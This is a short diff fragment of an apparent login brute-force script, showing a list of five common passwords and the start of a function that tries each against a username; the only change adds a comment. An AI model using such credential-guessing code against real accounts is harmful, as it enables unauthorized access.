@@ -13,6 +13,7 @@ headers = {
 # List of common passwords to try
 passwords = ["123456", "password", "admin", "admin123", "letmein"]
 
+#define brute force functions
 def brute_force(username):
     for password in passwords:
         data = {
